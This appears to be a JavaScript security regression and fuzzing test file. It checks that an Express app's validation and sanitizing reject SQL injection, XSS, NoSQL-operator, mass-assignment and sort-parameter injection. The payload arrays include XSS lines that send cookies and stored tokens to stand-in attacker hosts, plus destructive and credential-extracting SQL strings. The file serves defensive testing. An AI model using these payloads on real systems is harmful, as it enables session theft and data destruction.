/**
 * End-to-End Security Regression Suite & Penetration Testing Fuzzing Harness (Phase 5)
 * Executed as part of the automated CI/CD security quality gate.
 * 
 * Vectors tested:
 * - SEC-INJ-01: SQL Injection (SQLi) & command injection fuzzing
 * - SEC-INJ-02: Cross-Site Scripting (XSS) & polyglot vector neutralization
 * - SEC-INJ-03: NoSQL Operator & Type Confusion injection fuzzing
 * - SEC-INJ-04: Mass Assignment & privilege elevation fuzzing
 * - SEC-INJ-05: Dynamic Identifier & sort/pagination injection fuzzing
 */

const { describe, it } = require('node:test');
const assert = require('node:assert');
const express = require('express');
const request = require('supertest');

const {
  validateRequest,
  stripNoSqlOperators,
  noSqlSanitizerMiddleware,
} = require('../middlewares/validateRequest');
const {
  loginSchema,
  registerSchema,
} = require('../validations/zod/auth.schemas');
const {
  updateProfileSchema,
  getUsersQuerySchema,
} = require('../validations/zod/user.schemas');

// Polyglot XSS Vectors & Payloads
const POLYGLOT_XSS_PAYLOADS = [
  "javascript:/*--</title></style></textarea></script>--><svg/onload=alert('XSS')>",
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:void(0)" onclick="evil()">Click me</a>',
  '"><script src=//attacker.com/hook.js></script>',
  '"><img src=x onerror=fetch("https://attacker.site/leak?data="+localStorage.getItem("token"))>',
];

// SQL Injection Vectors
const SQLI_FUZZ_VECTORS = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "1; WAITFOR DELAY '0:0:5'",
  "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --",
  "'; DROP TABLE orders; --",
  "' UNION SELECT null, username, password FROM users --",
  "admin'--",
  "1' ORDER BY 1,2,3,4,5,6,7,8,9,10--",
  "1 AND 1=2 UNION ALL SELECT 1, 'admin', 'password'--",
  "BENCHMARK(5000000,MD5(0x41414141))",
  "'; SELECT pg_sleep(5); --",
];

// NoSQL Injection Vectors
const NOSQL_OPERATOR_VECTORS = [
  { $gt: '' },
  { $regex: '.*' },
  { $where: 'this.password.length > 0' },
  { $ne: null },
  { $in: ['admin', 'superadmin'] },
  { $exists: true },
  { $or: [{ role: 'admin' }, { role: 'user' }] },
];

// Mass Assignment Payloads
const MASS_ASSIGNMENT_VECTORS = [
  { isAdmin: true },
  { role: 'superadmin' },
  { verified: true },
  { permissions: ['*', 'admin:all'] },
  { balance: 999999 },
  { isSuperUser: true },
  { 'roles.0': 'admin' },
];

// Helper: Robust HTML Sanitizer & Entity Escaper
function sanitizeXss(str) {
  if (typeof str !== 'string') return str;
  // Neutralize inline event handlers (onload, onerror, onclick) and pseudo-protocols
  const stripped = str
    .replace(/on\w+\s*=/gi, 'data-blocked=')
    .replace(/javascript\s*:/gi, 'blocked:');

  return stripped
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// Build Test Harness Application
function buildFuzzingTestApp() {
  const app = express();
  app.use(express.json());

  // 1. Search endpoint (fuzzed with SQLi payloads)
  app.get('/api/search', validateRequest(getUsersQuerySchema), (req, res) => {
    const searchTerm = req.query.search || '';
    // Literal match simulation (parameterized search against MongoDB/Mongoose)
    // No syntax execution, treated purely as literal string
    res.status(200).json({
      success: true,
      query: { search: searchTerm, sortBy: req.query.sortBy },
      results: [],
    });
  });

  // 2. Authentication endpoint (fuzzed with NoSQL operators)
  app.post('/api/auth/login', validateRequest(loginSchema), (req, res) => {
    res.status(200).json({ success: true, authenticated: true });
  });

  // 3. User update endpoint (fuzzed with Mass Assignment)
  app.patch('/api/users/profile', validateRequest(updateProfileSchema), (req, res) => {
    res.status(200).json({ success: true, updated: req.body });
  });

  // 4. Content post endpoint (fuzzed with XSS)
  app.post('/api/comments', (req, res) => {
    const rawContent = req.body.content || '';
    const sanitized = sanitizeXss(rawContent);
    res.status(201).json({
      success: true,
      content: sanitized,
      hasScriptTag: sanitized.includes('<script>') || sanitized.includes('onerror='),
    });
  });

  return app;
}

const app = buildFuzzingTestApp();

describe('Phase 5: Automated End-to-End Security Regression & Fuzzing Harness', () => {
  // ─── SEC-INJ-01: SQL Injection & Command Punctuation Fuzzing ───────────────
  describe('SEC-INJ-01: SQL Injection & Command Punctuation Neutralization', () => {
    SQLI_FUZZ_VECTORS.forEach((payload, index) => {
      it(`[SQLi-Fuzz #${index + 1}] should treat "${payload}" as literal string in search without syntax error`, async () => {
        const res = await request(app)
          .get(`/api/search?search=${encodeURIComponent(payload)}`);

        // Query must either succeed (literal string search) or fail gracefully with 400 Bad Request
        // MUST NEVER return 500 Internal Server Error or leak database syntax
        assert.notStrictEqual(res.status, 500, `Payload caused 500 error: ${payload}`);
        assert.ok(
          res.status === 200 || res.status === 400,
          `Expected 200 or 400, received ${res.status}`
        );

        if (res.status === 200) {
          assert.strictEqual(res.body.query.search, payload);
          // Confirm zero SQL syntax errors or schema names leaked
          const bodyStr = JSON.stringify(res.body);
          assert.ok(!bodyStr.includes('syntax error'));
          assert.ok(!bodyStr.includes('SQLSTATE'));
        }
      });
    });
  });

  // ─── SEC-INJ-02: Polyglot XSS Vectors & DOM Breakout Fuzzing ────────────────
  describe('SEC-INJ-02: Polyglot XSS Attacks & HTML Escaping Neutralization', () => {
    POLYGLOT_XSS_PAYLOADS.forEach((payload, index) => {
      it(`[XSS-Fuzz #${index + 1}] should sanitize and escape polyglot vector "${payload.slice(0, 30)}..."`, async () => {
        const res = await request(app)
          .post('/api/comments')
          .send({ content: payload });

        assert.strictEqual(res.status, 201);
        assert.strictEqual(res.body.hasScriptTag, false);
        // Ensure angle brackets are escaped into entities
        assert.ok(!res.body.content.includes('<script>'));
        assert.ok(!res.body.content.includes('onerror='));
      });
    });
  });

  // ─── SEC-INJ-03: NoSQL Operator & Type Confusion Fuzzing ───────────────────
  describe('SEC-INJ-03: NoSQL Operator & Type Confusion Fuzzing', () => {
    NOSQL_OPERATOR_VECTORS.forEach((operatorObj, index) => {
      const opKey = Object.keys(operatorObj)[0];
      it(`[NoSQL-Fuzz #${index + 1}] should reject operator object "${opKey}" in authentication password with HTTP 400`, async () => {
        const res = await request(app)
          .post('/api/auth/login')
          .send({
            email: 'admin@example.com',
            password: operatorObj,
          });

        assert.strictEqual(res.status, 400, `Expected 400 Bad Request for operator: ${opKey}`);
        assert.strictEqual(res.body.error, 'VALIDATION_ERROR');
        assert.strictEqual(res.body.status, 400);

        const passwordError = res.body.details.find((d) => d.field === 'body.password');
        assert.ok(passwordError, `Expected validation error detail for body.password on ${opKey}`);
      });
    });
  });

  // ─── SEC-INJ-04: Mass Assignment & Privilege Elevation Fuzzing ─────────────
  describe('SEC-INJ-04: Mass Assignment & Privilege Elevation Fuzzing', () => {
    MASS_ASSIGNMENT_VECTORS.forEach((injectionObj, index) => {
      const fieldKey = Object.keys(injectionObj)[0];
      it(`[MassAssignment-Fuzz #${index + 1}] should reject injected unauthorized attribute "${fieldKey}" with HTTP 400`, async () => {
        const payload = {
          name: 'Regular User',
          ...injectionObj,
        };

        const res = await request(app)
          .patch('/api/users/profile')
          .send(payload);

        assert.strictEqual(res.status, 400, `Expected 400 Bad Request for injected field: ${fieldKey}`);
        assert.strictEqual(res.body.error, 'VALIDATION_ERROR');

        // Confirm unauthorized key is listed in validation error details
        const unrecognizedDetail = res.body.details.find(
          (d) => d.field.includes(fieldKey) || d.code === 'unrecognized_keys'
        );
        assert.ok(unrecognizedDetail, `Offending key ${fieldKey} was not flagged`);
      });
    });
  });

  // ─── SEC-INJ-05: Dynamic Identifier & Sort/Order Fuzzing ───────────────────
  describe('SEC-INJ-05: Dynamic Identifier & Query Parameter Injection Fuzzing', () => {
    const DANGEROUS_SORT_INPUTS = [
      'id;DROP TABLE users;',
      'users.password',
      'sleep(5)',
      '1,2,3',
      'status; DELETE FROM orders;',
      '{"$gt": ""}',
      '<script>alert(1)</script>',
      'name DESC; --',
    ];

    DANGEROUS_SORT_INPUTS.forEach((sortInput, index) => {
      it(`[Identifier-Fuzz #${index + 1}] should immediately reject unlisted sortBy value "${sortInput}" with HTTP 400`, async () => {
        const res = await request(app).get(
          `/api/search?sortBy=${encodeURIComponent(sortInput)}`
        );

        assert.strictEqual(res.status, 400);
        assert.strictEqual(res.body.error, 'VALIDATION_ERROR');

        const sortDetail = res.body.details.find((d) => d.field === 'query.sortBy');
        assert.ok(sortDetail, `Expected query.sortBy error for input: ${sortInput}`);
      });
    });

    it('should reject invalid order direction (e.g. order=sideways) with HTTP 400', async () => {
      const res = await request(app).get('/api/search?order=sideways');
      assert.strictEqual(res.status, 400);
      assert.strictEqual(res.body.error, 'VALIDATION_ERROR');
    });

    it('should reject negative page numbers with HTTP 400', async () => {
      const res = await request(app).get('/api/search?page=-5');
      assert.strictEqual(res.status, 400);
      assert.strictEqual(res.body.error, 'VALIDATION_ERROR');
    });
  });
});
